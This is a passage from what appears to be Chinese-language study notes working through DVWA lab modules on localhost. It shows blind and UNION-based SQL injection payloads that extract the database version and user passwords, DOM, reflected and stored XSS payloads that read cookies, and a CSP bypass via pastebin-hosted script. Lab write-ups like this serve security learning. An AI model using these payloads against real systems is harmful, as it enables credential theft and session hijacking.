+</p><pre id="785ac360-6fa5-4a14-aaa9-1cc7e009d302" class="code code-wrap"><code>0&#x27; UNION SELECT 1,SUBSTRING((select @@version), 1, 20)&#x27;</code></pre><p id="d4c927d4-7127-4abd-9c4a-f418ee3dc732" class="">這是在非 blind injection 查詢 db version 的結果</p><figure id="cf15a063-0a39-4f42-877c-e1e68a41ae3b" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2077.png"><img style="width:1454px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2077.png"/></a></figure><p id="fc7aecc6-16e3-49b7-b6ba-5166f5f331f6" class="">
+</p><pre id="f231ff6f-80b7-4033-a504-ec43d33accbe" class="code code-wrap"><code>0&#x27; UNION SELECT 1,SUBSTRING((select @@version), 1, 20)&#x27;</code></pre><figure id="95f88b2a-d02b-4329-b29d-2fab9fc4010b" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2078.png"><img style="width:1290px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2078.png"/></a></figure><p id="f0c0e51e-0685-4c29-b7a9-fbe06ace0914" class="">
+</p><p id="999788a4-1437-4b8c-a0dc-76145405a894" class="">從這邊我們大概可以推測接下來需要透過 blind injection 來比對 <code>10.x.x ...</code> 這類的版本字串</p><p id="195b0035-4398-426b-a1db-339568d3ad40" class="">
+</p><p id="ba7ee58e-d82d-4284-8436-dd96af3a1027" class="">接下來利用 function <code>@@version</code> , <code>SUBSTRING</code>搭配 <code>IF</code> 語法應該就可以猜測版本了</p><pre id="50536a8e-2b7c-439e-967b-3acd3787fb06" class="code code-wrap"><code>@@version</code></pre><pre id="5d97bef6-2339-426f-8e03-a493a5160719" class="code code-wrap"><code>SELECT IF(STRCMP(&#x27;test&#x27;,&#x27;test1&#x27;),&#x27;no&#x27;,&#x27;yes&#x27;);</code></pre><pre id="7bcbbef2-3047-4a0f-b993-6a7069a533c3" class="code code-wrap"><code>SELECT SUBSTRING((select @@version), 1, 5) AS ExtractString;</code></pre><p id="0b1203da-2102-4640-b79e-68abf1264ec8" class="">
+</p><p id="cd91eace-5fc2-4cc5-9073-c0d21ecb9cfc" class="">確認 IF 能和 SELECT @@VERSION 正常搭配使用</p><pre id="a26c94bc-d3fc-4124-b20f-616577712dd6" class="code code-wrap"><code>SELECT IF ((SELECT @@version) = &#x27;10.3.32-MariaDB-1:10.3.32+maria~focal&#x27;, &#x27;pass&#x27;, &#x27;failed&#x27;);</code></pre><p id="30e3c846-76d3-4eab-ba9f-e160847e27c9" class="">
+</p><pre id="d920cc2b-ff3c-4964-907c-21e196181977" class="code code-wrap"><code>SELECT IF (SUBSTRING((SELECT @@version),1,2) = &#x27;10&#x27;, &#x27;pass&#x27;, &#x27;failed&#x27;);</code></pre><figure id="dea8b11d-3a8b-4e9a-9ce5-3680f34e44c5" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2079.png"><img style="width:1446px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2079.png"/></a></figure><figure id="74ee0a36-2d2a-4ffc-92ed-6e7dfea66404" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2080.png"><img style="width:1152px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2080.png"/></a></figure><p id="fa9f3828-7579-4474-8ffe-89c881091669" class="">
+</p><p id="d39f6ca8-606f-477f-8ea8-4c0ae4c24197" class="">加上 <code>1,IF...</code></p><figure id="854298a2-84c6-4ef9-896b-f77638555e82" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2081.png"><img style="width:1358px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2081.png"/></a></figure><p id="5c1194d7-c9e2-4dc0-8315-0692dd8f4318" class="">
+</p><p id="3f803dce-39f0-4ed3-9e7b-3c9a055c0666" class="">用 like % 來測試看看</p><pre id="1e98f49d-ded8-4b99-b8b4-60f76df6ed3b" class="code code-wrap"><code>SELECT IF (SUBSTRING((SELECT @@version),1,7) like &#x27;10.%&#x27;, &#x27;pass&#x27;, &#x27;failed&#x27;);</code></pre><p id="92957a32-e7e6-4a30-9dcb-b169cac2491a" class="">
+</p><p id="9714c1bb-ec1a-47fb-a676-d0b256a288fe" class="">
+</p><div id="5e04ba0f-702a-4663-9364-59d7499e7787" class="column-list"><div id="484b0da5-fc0e-4a64-acce-2e8dbf09384c" style="width:50%" class="column"><pre id="17249b3c-becb-44d9-a2f6-ea4bec641512" class="code code-wrap"><code># response code is 404
+0</code></pre></div><div id="ed3758b9-3251-4b7f-870f-caf55013cd4f" style="width:50%" class="column"><figure id="706e9f5b-a4e5-4a33-b93d-4b0a91739773" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2082.png"><img style="width:1326px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2082.png"/></a></figure></div></div><div id="ca040e6a-9327-40fa-b007-09870c5be211" class="column-list"><div id="dd6b5850-ec4b-4774-adae-f9452c6fa8e5" style="width:50%" class="column"><pre id="1c44b128-8195-43a5-a39f-579416bf38be" class="code code-wrap"><code>1</code></pre></div><div id="8a21f6ed-15cc-4241-bb64-8911a428046c" style="width:50%" class="column"><figure id="03027c50-6abc-45cf-9c08-eda445e3b07d" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2083.png"><img style="width:1274px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2083.png"/></a></figure></div></div><p id="bda4a088-abf7-423d-910a-6873481fa152" class="">
+</p><div id="ae031816-afe2-4cee-8d3e-5a84e58b3f51" class="column-list"><div id="bd160686-4a3a-4f29-96f9-e83b1d7d425f" style="width:50%" class="column"><pre id="c8eb7df3-ff72-479c-970d-6cf86d4f6c0b" class="code code-wrap"><code># response code is 200
+0&#x27; UNION SELECT first_name,password FROM users WHERE user_id &lt;&gt;&#x27;</code></pre></div><div id="9a13e67f-6cfe-4b1e-8b61-86da676af893" style="width:50%" class="column"><figure id="8723f365-cb93-4a76-bc2e-b314f29fbb8b" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2084.png"><img style="width:1276px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2084.png"/></a></figure></div></div><p id="56b7e59b-3dee-445f-bee3-d05016848f60" class="">
+</p><p id="d3d5f2bf-0221-4947-b90c-d0206d3b9b47" class="">如果只回傳一個欄位，會得到 404</p><div id="b31193d1-64b9-4877-9e2d-8d7ec29aa780" class="column-list"><div id="e6dafbf4-07e0-41b9-b2ec-f9ecabc4e3cc" style="width:56.25%" class="column"><pre id="c3ac0c81-7d06-4ba6-9c67-8eb45848e2f2" class="code code-wrap"><code># 404
+0&#x27; UNION SELECT password FROM users WHERE user_id &lt;&gt;&#x27;</code></pre><p id="144b1ea4-59e1-4e72-8fbf-8a89dc0e901a" class="">
+</p></div><div id="da6b9c1e-bd3e-4968-b65a-ec8957238606" style="width:43.75%" class="column"><figure id="fceecc4d-7394-4836-8994-937597a7440f" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2085.png"><img style="width:1290px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2085.png"/></a></figure><figure id="91acb65e-67a1-4406-8284-3747e89e6f78" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2086.png"><img style="width:2660px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2086.png"/></a></figure></div></div><p id="28d71253-ce62-436c-b207-18137cf7e837" class="">
+</p><h3 id="dc58d15f-ac3d-41ae-bf16-7b598a6f8a6b" class="">分析</h3><h3 id="1dbb5c0d-d168-42bd-9007-071953dfd22f" class="">1. 如果要使用 UNION，那 UNION 左邊和右邊需要回傳一樣的欄位數量</h3><h3 id="aa52aaa7-10ca-4acf-a61c-39b710da0938" class="">2. 可以不透過 IF 來判斷版本</h3><pre id="8027ac7e-6fdc-491d-a14a-501d773fad54" class="code code-wrap"><code>SELECT SUBSTRING((SELECT @@version),1,2) = 10 AS &#x27;test&#x27;;</code></pre><p id="0b8065ec-167f-4195-8578-0349f2101142" class="">掌握簡單的判斷</p><pre id="32ea53b1-c422-4086-a241-cc295ccf6837" class="code code-wrap"><code>select 1=1 AS &#x27;test&#x27;;</code></pre><pre id="939f911c-4816-44c7-9a25-1e606a426616" class="code code-wrap"><code>select 1=2 AS &#x27;test&#x27;;</code></pre><p id="c8e8b675-6b58-4aa3-8caa-fada5b8cede9" class="">
+</p><h2 id="37724e17-1017-4296-b6b4-4af1fbb4fcfd" class="">卡關</h2><p id="cac0ac18-a247-4e4d-8d69-d3effa8b47c4" class="">在這邊卡關了，因為太執著於用 SELECT,IF, UNION 的語法，後來看了一下提示的頁面，發現被遮住的答案提示長度並不常，代表應該有更簡短的寫法，因此改變方向，試著思考更簡短的判斷方式，就是 A AND B 這種形式的語法</p><p id="4c8d5dc7-4c01-4544-b4b8-0a06c4a3df0a" class="">
+</p><p id="38d1a890-bc79-42dd-a483-6b9aae3ad3b0" class="">接著順便重新梳理一下資訊，從推測程式語法的階段開始推敲:</p><p id="28fec8e5-a1cb-481a-be78-f4c0a5612932" class="">可以假設原本的 SQL 大概長這樣</p><pre id="3c23e2bf-bf29-47a3-af65-f67398a025a9" class="code code-wrap"><code>SELECT * FROM users WHERE id=0;</code></pre><p id="139dc006-8377-4637-81d2-e08a9b3196bc" class="">用 SQL injection 把它變成 <code>A OR B</code> 的形式就可以判斷 true false 了</p><pre id="6243cbf6-8586-42d0-8936-f8667945f276" class="code code-wrap"><code>SELECT * FROM users WHERE id=0 OR (SELECT SUBSTRING((SELECT @@version),1,2) = &#x27;10&#x27;);</code></pre><p id="7e0710a3-dbb5-4e39-9056-8e95d3a989e6" class="">所以根據之前的 query 結果，我們只要加上版本判斷</p><pre id="1d0aa937-df56-4668-9733-18cbfdccc1a8" class="code code-wrap"><code>1&#x27; AND (SELECT SUBSTRING((SELECT @@version),1,2) = &#x27;10&#x27;)</code></pre><p id="769fbf1e-8e39-401c-b867-a0093ea2f3a1" class="">還有為了滿足 injection 的 single quote <code>1=&#x27;1</code> 在結尾</p><pre id="036dbb01-cc82-441a-a813-e7c7f31d4372" class="code code-wrap"><code>1&#x27; AND (SELECT SUBSTRING((SELECT @@version),1,2) = &#x27;10&#x27;) AND 1=&#x27;1</code></pre><figure id="f5689a3a-d342-47ba-b33a-88f037b87f08" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2087.png"><img style="width:1308px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2087.png"/></a></figure><p id="ca7210f4-67bd-4bb5-90f9-54b3a502750c" class="">
+</p><h3 id="7de8f1ef-30c0-4e2f-8d91-61e5a3fade34" class="">驗證測試</h3><p id="46d3b302-cd18-4a17-a7d8-4255c2c82fad" class="">這邊要故意輸入錯誤的版本，確認頁面回傳的結果是否為 false，代表我們使用的 injection 邏輯是正確的</p><pre id="66ad0015-dc5b-41a3-b1db-431a2d254c72" class="code code-wrap"><code>1&#x27; AND (SELECT SUBSTRING((SELECT @@version),1,2) = &#x27;xx10&#x27;) AND 1=&#x27;1</code></pre><figure id="98b60ea1-10bf-433f-b8d7-6bd6deabbcf9" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2088.png"><img style="width:1282px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2088.png"/></a></figure><p id="2dce8f87-9c0b-4342-bda1-390875486935" class="">
+</p><h3 id="b8f472b7-e446-4b92-8757-dc6b60b694ae" class="">開始推測</h3><p id="d956d175-81e8-43b4-9376-a92ec4482fd4" class="">接下來就是利用 <code>like</code> 來慢慢逼近或猜測，或用工具會比較方便</p><pre id="1cd465ef-3b3b-42ed-af58-d6a4f66aa2ae" class="code code-wrap"><code># 200
+1&#x27; AND (SELECT SUBSTRING((SELECT @@version),1,20) like &#x27;10.%&#x27;) AND 1=&#x27;1</code></pre><pre id="010f3931-8b0b-4cd6-be00-ffee1d77911f" class="code code-wrap"><code># 200
+1&#x27; AND (SELECT SUBSTRING((SELECT @@version),1,20) like &#x27;10.1%&#x27;) AND 1=&#x27;1</code></pre><pre id="c7ac447f-b56d-4d8b-b0c1-eb6c97a180b5" class="code code-wrap"><code># 404
+1&#x27; AND (SELECT SUBSTRING((SELECT @@version),1,20) like &#x27;10.12%&#x27;) AND 1=&#x27;1</code></pre><pre id="ed396129-72a9-49ec-a665-4a64bf1e42d2" class="code code-wrap"><code># 200
+1&#x27; AND (SELECT SUBSTRING((SELECT @@version),1,20) like &#x27;10.1.%&#x27;) AND 1=&#x27;1</code></pre><pre id="7fe614f1-9a5c-4079-8938-0948187a91df" class="code code-wrap"><code># 200
+1&#x27; AND (SELECT SUBSTRING((SELECT @@version),1,20) like &#x27;10.1.2%&#x27;) AND 1=&#x27;1</code></pre><pre id="8ae7754d-7559-4518-9413-10ea042252ea" class="code code-wrap"><code># 400
+1&#x27; AND (SELECT SUBSTRING((SELECT @@version),1,20) like &#x27;10.1.2.%&#x27;) AND 1=&#x27;1</code></pre><pre id="4cae821b-70c8-4e8a-a47a-10fa18813ece" class="code code-wrap"><code># 400
+1&#x27; AND (SELECT SUBSTRING((SELECT @@version),1,20) like &#x27;10.1.2%&#x27;) AND 1=&#x27;1</code></pre><figure id="b7964c01-4451-4f3a-9839-a446ae87ad68" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2089.png"><img style="width:2158px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2089.png"/></a></figure><h3 id="1cdf16a6-96a6-4d00-83c3-742f1c72e708" class="">✨Done✨</h3><pre id="df153532-deb0-49ca-a640-f1fa51c2138c" class="code code-wrap"><code># 200
+1&#x27; AND (SELECT SUBSTRING((SELECT @@version),1,20) like &#x27;10.1.26%&#x27;) AND 1=&#x27;1</code></pre><figure id="1d608d32-6170-489c-9d4b-a708ed45e61c" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2090.png"><img style="width:1527px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2090.png"/></a></figure><figure id="d1b9c144-4a18-4460-a522-5863cfe472e1" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2091.png"><img style="width:2482px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2091.png"/></a></figure><p id="f46a2c2a-3cc4-401e-93fd-e6755f869cf8" class="">最後再測試版號是否已經結束</p><pre id="5bae5264-b78a-484d-a068-b9139c5156f9" class="code code-wrap"><code># 400
+1&#x27; AND (SELECT SUBSTRING((SELECT @@version),1,20) like &#x27;10.1.26.%&#x27;) AND 1=&#x27;1</code></pre><p id="890ea553-49eb-4b41-b90d-0c5fc69e7112" class="">
+</p><p id="86bb3f05-c9d1-4fd3-83cd-08a89940d09f" class="">到目前為止可以看出 DB 的版本是 <code>10.1.26</code></p><h2 id="02b235c1-9380-4c2c-9de3-f893eef44798" class="">memo</h2><ul id="14dd5487-84bd-4836-ae63-63d131fbeb79" class="toggle"><li><details open=""><summary>SQL 測試的殘渣</summary><pre id="0b98be08-9935-4eee-82a6-50edd603b755" class="code code-wrap"><code>0&#x27; UNION SELECT 1,IF (SUBSTRING((SELECT @@version),1,7) like &#x27;10.%&#x27;, &#x27;pass&#x27;, &#x27;failed&#x27;)&#x27;</code></pre><pre id="b18a0593-dde2-4698-8431-7aeba87d0354" class="code code-wrap"><code>0&#x27; UNION SELECT IF (SUBSTRING((SELECT @@version),1,2) = &#x27;10&#x27;, &#x27;pass&#x27;, &#x27;failed&#x27;) WHERE &#x27;1&#x27;=&#x27;1</code></pre><pre id="31168638-efc5-4dc7-b60a-e917ab5f8e2c" class="code code-wrap"><code># User ID exists in the database.
+0&#x27; UNION SELECT 1,IF (SUBSTRING((SELECT @@version),1,7) like &#x27;10.%&#x27;, &#x27;pass&#x27;, &#x27;failed&#x27;)&#x27;</code></pre><pre id="7145684d-2861-420c-b883-874f6b957834" class="code code-wrap"><code>0&#x27; SELECT 1,IF (SUBSTRING((SELECT @@version),1,2) = &#x27;10&#x27;, TRUE, FALSE)&#x27;
+</code></pre><pre id="1f95bb33-fac1-4517-ab7d-0279b1193ad1" class="code code-wrap"><code>2&#x27; UNION SELECT user_id,password FROM users WHERE user_id=&#x27;1</code></pre><pre id="18ee410e-d352-4361-b372-730491bee178" class="code code-wrap"><code>0&#x27; UNION SELECT 1,IF (SUBSTRING((SELECT @@version),1,2) = &#x27;10&#x27;, TRUE, FALSE)</code></pre><pre id="dcbe9e7a-180f-48e0-8965-3b55fffac9c2" class="code code-wrap"><code>0&#x27; UNION SELECT 1,IF (SUBSTRING((SELECT @@version),1,2) = &#x27;10&#x27;, TRUE, FALSE) AS 2&#x27;</code></pre><pre id="fd605623-fca9-448f-b24f-3122790c7ad5" class="code code-wrap"><code>0&#x27; UNION SELECT 1 WHERE &#x27;1&#x27;=1&#x27;</code></pre><pre id="f148e1dc-2b98-44ee-b6b8-6ed6bc14562b" class="code code-wrap"><code>0&#x27; UNION SELECT 1, (IF (SUBSTRING((SELECT @@version),1,2) = &#x27;10&#x27;, TRUE, FALSE)) AS &#x27;2</code></pre><pre id="8709e3d5-aa54-4269-aa14-3549d917bf4a" class="code code-wrap"><code>0&#x27; UNION SELECT 1, (IF (SUBSTRING((SELECT @@version),1,2) = &#x27;10&#x27;, TRUE, FALSE)) AS &#x27;2</code></pre><pre id="92284a8b-b650-4401-a672-3cd9e9b77aa6" class="code code-wrap"><code>0&#x27; UNION SELECT 1, (IF (SUBSTRING((SELECT @@version),1,2) = &#x27;10&#x27;, &#x27;pass&#x27;, &#x27;failed&#x27;)) AS &#x27;2</code></pre><pre id="c3e449b8-fe89-4608-866f-4c7b285ff2e5" class="code code-wrap"><code>0&#x27; UNION SELECT 1,(IF (SUBSTRING((SELECT @@version),1,2) = &#x27;00&#x27;, TRUE, FALSE))
+</code></pre><pre id="c4b5155a-ddf4-4f39-96ad-835b00091ac8" class="code code-wrap"><code>0&#x27; UNION SELECT (IF (SUBSTRING((SELECT @@version),1,2) = &#x27;10&#x27;, TRUE, FALSE))
+</code></pre><pre id="d21e5ce4-2631-42f8-9e45-16e66a79503a" class="code code-wrap"><code>0&#x27; OR SUBSTRING((SELECT @@version),1,2) = &#x27;10&#x27;</code></pre><pre id="d615096f-cc0d-48b1-943d-c044f9f07486" class="code code-wrap"><code>0&#x27; UNION SELECT user_id,password from users WHERE user_id = &#x27;0</code></pre></details></li></ul><p id="2c3e8267-70cf-4341-b86e-ec8fb717131b" class="">
+</p><hr id="824dde6f-5464-41b7-944e-f19e161abaaa"/><h1 id="bb14437f-c7a0-40ee-9a01-e6da4cb749fe" class="">9. Weak Session IDs</h1><h3 id="613aa4fd-7d68-4a02-b1d7-8dc4ff608c0b" class="">Objective: This module uses four different ways to set the dvwaSession cookie value, the objective of each level is to work out how the ID is 
+generated and then infer the IDs of other system users.</h3><p id="0f73152e-b579-4da3-aadf-a32b85ac784e" class="">
+</p><h3 id="8b8d9d48-f775-4f60-af2a-13bdbfb08656" class="">觀察</h3><figure id="8bd8f84f-6f3e-407c-afea-70b1252e39ab" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2092.png"><img style="width:2542px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2092.png"/></a></figure><figure id="c1a3449a-6846-4775-bdfe-45d6c2bdd4de" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2093.png"><img style="width:812px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2093.png"/></a></figure><figure id="f3e206c7-03c3-469f-b117-ca9c33cb34c7" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2094.png"><img style="width:812px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2094.png"/></a></figure><p id="c0f71de4-417c-418c-a882-a8b5ca5f0843" class="">可以很明顯地看出 dvwaSession 是遞增的</p><p id="1c962101-0305-4862-93e8-7445f8f85bf9" class="">
+</p><p id="a9393b1f-ef21-4ced-980e-262af08e64b5" class="">
+</p><hr id="7e3f8247-e8c9-4a15-8d86-ac70f03cb22b"/><h1 id="bc7b2ea2-5262-4791-be7d-a21ad43602ee" class="">10. DOM Based Cross Site Scripting (XSS)</h1><h3 id="5230530a-12e7-4347-b7da-906e4a23a5a7" class="">Objective: Run your own JavaScript in another user&#x27;s browser, use this to steal the cookie of a logged in user.</h3><h3 id="ba16c4aa-e653-4069-890d-e9b0f6f5c66c" class="">觀察</h3><p id="87c4478b-4db6-4995-9a7f-3416d8af34ba" class="">可以直接從 URL 塞入任意字串，頁面回傳後直接 render 在表單內，代表我們可以試著塞入 javascript 看看</p><pre id="f91d095f-259b-4a63-8d60-e6d4336c6935" class="code code-wrap"><code>http://localhost:8086/vulnerabilities/xss_d/?default=English123</code></pre><figure id="4b29e6b0-e6a4-45ea-8d2a-a3a01df1049b" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2095.png"><img style="width:2018px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2095.png"/></a></figure><p id="61470968-4382-4a36-b72e-759ae9763ba3" class="">
+</p><pre id="6ad2431b-886f-467a-84e7-edded9827c7f" class="code code-wrap"><code>http://localhost:8086/vulnerabilities/xss_d/?default=English&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><figure id="734eac92-1dd3-49dd-abfe-207e0cfc4ce5" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2096.png"><img style="width:2034px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2096.png"/></a></figure><p id="3c51cd94-073c-458e-a7a9-2d7d36d93294" class="">
+</p><h3 id="0f342a28-74cb-4792-b177-8553d21f88fc" class="">✨Done✨</h3><pre id="f05db263-99dd-4f85-b11b-91f57ad11d6a" class="code code-wrap"><code>http://localhost:8086/vulnerabilities/xss_d/?default=English&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre><figure id="048839ac-4062-49bd-9316-e45393ef3abc" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2097.png"><img style="width:1354px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2097.png"/></a></figure><p id="731d4fbc-c3e5-4c8b-b68e-a24475696250" class="">
+</p><h3 id="007abd42-3143-4c78-a633-f78ae2b70a08" class="">Ref</h3><h3 id="d5cba4bb-e68d-40db-9814-e7e28a19c2c8" class="">Types of XSS</h3><div id="884f5d56-57be-4543-8704-c4f0bedce315" class="column-list"><div id="95c01044-68d3-4669-8cf8-25cbe648aba2" style="width:50%" class="column"><p id="8b6e6dad-76a4-4da8-9bf8-6897fbf852d8" class="">Types of XSS | OWASP Foundation
+<a href="https://owasp.org/www-community/Types_of_Cross-Site_Scripting#DOM_Based_XSS_.28AKA_Type-0.29">https://owasp.org/www-community/Types_of_Cross-Site_Scripting#DOM_Based_XSS_.28AKA_Type-0.29</a></p></div><div id="89746776-e5bb-45b8-8986-71d837cebfde" style="width:50%" class="column"><figure id="e1e18516-29b0-40fb-a93e-a914799b35b2" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2098.png"><img style="width:384px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2098.png"/></a></figure></div></div><p id="fddafef8-1545-4605-bf66-2d459890eadc" class="">
+</p><p id="602bc8c0-9c2e-45e8-a4bd-63d46f9a7a7a" class="">
+</p><hr id="da90f42d-d55e-4abd-a4d9-3c050b4b443e"/><h1 id="df806f22-a4c5-4768-aaef-4b75d5f13341" class="">11. Reflected Cross Site Scripting (XSS)</h1><h2 id="733e6960-b860-4e73-b0d9-ccc5cdf32407" class="">觀察</h2><p id="a931a04d-0748-4188-a428-4bc9e7b99faa" class="">可以直接從 input box 輸入也可以從 URL bar 輸入 malicious script</p><figure id="dbe9fb16-f784-49f9-9197-ce447f8f27f5" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2099.png"><img style="width:2190px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2099.png"/></a></figure><p id="8ca01168-4d07-4213-a2b7-04f047ffab38" class="">
+</p><h3 id="b6c0f9c3-17e4-4515-8f46-72b7c45a6e01" class="">✨Done✨</h3><pre id="220a1da6-8b6c-4bc0-91e7-d544c257f80f" class="code code-wrap"><code>&lt;script&gt;console.log(document.cookie)&lt;/script&gt;</code></pre><pre id="7e3fe838-6a03-4e5d-8888-3ec58a012852" class="code code-wrap"><code>localhost:8086/vulnerabilities/xss_r/?name=&lt;script&gt;console.log(document.cookie)&lt;/script&gt;</code></pre><figure id="159552bd-554d-4994-9ed1-6e4197063c65" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20100.png"><img style="width:2574px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20100.png"/></a></figure><p id="46295548-5182-46f9-9bd9-3f3d66cf8ba6" class="">
+</p><hr id="32d746d6-99fe-4d47-9830-77c346e98852"/><h1 id="0593f4bd-d6a2-4115-8cb6-6e50e026cfbd" class="">12. Stored Cross Site Scripting (XSS)</h1><pre id="b5e3774e-ea2f-47f8-aa95-076210135fd2" class="code code-wrap"><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre><figure id="0c9db45e-eb9a-4f37-836c-de09fe984a36" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20101.png"><img style="width:1584px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20101.png"/></a></figure><h3 id="4adfc186-fd13-4f0f-973f-7b5c99782a7d" class="">✨Done✨</h3><figure id="1ee9119b-19b6-4589-a4ac-4526c445188f" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20102.png"><img style="width:1572px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20102.png"/></a></figure><p id="57640bc5-3f27-4c15-84fc-5a097ff30ed1" class="">
+</p><hr id="ba64f540-b0f3-47e4-ba51-a6c1e83ba123"/><h1 id="0bab4e19-4261-4113-be06-61fc8fafc0c9" class="">13. Content Security Policy (CSP) Bypass</h1><h3 id="ac14265a-b5c2-4e1b-b70c-b648e859ae37" class="">Bypass Content Security Policy (CSP) and execute JavaScript in the page.</h3><blockquote id="34d31bb5-4edf-4da6-9019-b7714d758eb0" class="">The Content-Security-Policy header allows you to restrict how resources such as JavaScript, CSS, or pretty much anything that the browser loads.</blockquote><blockquote id="ac53221d-5344-426b-9466-3d2e033408e8" class="">Although it is primarily used as a HTTP response header, you can also apply it via a <a href="https://content-security-policy.com/examples/meta/">meta tag</a>.</blockquote><p id="0e5e55cc-e91b-470b-a463-64b5e16d8f1b" class="">
+</p><h2 id="27ff8af9-fb8d-4a5d-ae4e-a6b51b882c5b" class="">觀察 CSP 設定</h2><figure id="3a0ab150-c6e2-48a1-a20f-b5b20c28c569" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20103.png"><img style="width:1537px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20103.png"/></a></figure><figure id="cb96e04a-0adf-49cb-bc3a-8fc07bf8f72b" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20104.png"><img style="width:1328px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20104.png"/></a></figure><figure id="63e7ffae-4dd4-4cba-9309-38696f8e76c0" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20105.png"><img style="width:1748px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20105.png"/></a></figure><p id="b53b4018-cafe-4feb-83cb-2b44b658d8e8" class="">
+</p><h3 id="9ffc6cb8-2521-4c51-971a-4a5612518214" class="">script-src</h3><p id="8d2a869d-b338-4e1e-afb6-3152388b44ab" class="">可以看出這些來源的 script 是可以被接受的，所以任何從以下來載入的 script 都可以被執行</p><pre id="1ca11c61-20c4-4b32-a925-e05bc91d0ebc" class="code code-wrap"><code>Content-Security-Policy: script-src &#x27;self&#x27; https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;</code></pre><p id="59e049d7-e6b4-460e-b16e-c32b82cffc1a" class="">
+</p><h3 id="0070a149-98a1-4fe1-b1d8-dd5e887bf23c" class="">試著載入來自 pastebin 的 js file</h3><pre id="66b023ef-4d69-483a-8af8-c0d42c564bee" class="code code-wrap"><code>https://pastebin.com/assets/9ce1885/jquery.min.js</code></pre><p id="0f873f84-c927-4a8f-8510-3bb35501e80d" class="">
+</p><p id="c69a02a1-a3bc-4b7e-93ec-c6b597b59754" class="">原本頁面沒有 jQuery</p><figure id="c54fda6b-e88c-430e-9b44-7a5712225bfd" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20106.png"><img style="width:2664px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20106.png"/></a></figure><p id="547a14ab-8048-4d19-860f-efaf9d422865" class="">載入來自 <a href="https://pastebin.com/">https://pastebin.com/</a> 的 jquery file</p><figure id="4141d358-30b4-45a2-aa93-dd2b7c666c7a" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20107.png"><img style="width:1750px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20107.png"/></a></figure><h3 id="0af5ae0c-953e-4d63-b214-5e4cb53d9d83" class="">✨Done✨</h3><p id="9abea7dd-4794-465f-9fe1-7e804af1c3c7" class="">檢查後發現可以使用 jQuery 的 function 代表有成功載入</p><figure 